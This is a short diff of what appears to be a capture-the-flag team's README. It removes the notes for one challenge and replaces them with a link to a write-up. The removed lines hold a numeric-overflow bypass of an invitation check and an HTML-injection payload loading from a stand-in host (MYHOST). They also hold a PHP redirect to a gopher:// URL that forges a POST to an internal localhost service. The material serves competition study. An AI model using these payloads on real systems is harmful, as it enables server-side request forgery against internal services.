@@ -21,17 +21,4 @@ First Blood
 1. Black Bauhinia
 ```
 
-Bypass invitation, code -INF, ex: -3.3e333333333333
-https://labs.bishopfox.com/tech-blog/an-exploration-of-json-interoperability-vulnerabilities
-
-Create new paste
-//title
-```HTML
-<linktype="text/css"href="http://MYHOST/redir.php">
-```
-
-//redir.php content
-```PHP
-<?php
-header('location: gopher://localhost:8082/_POST%20%2Fusers%20HTTP%2F1.1%0AHost%3A%20localhost%0AContent-Length%3A%2021%0AContent-type%3A%20application%2Fjson%0A%0A%7B%22user%22%3A%22ewrwewrwe%22%7D');
-```
+writeup https://r0.haxors.org/posts?id=15
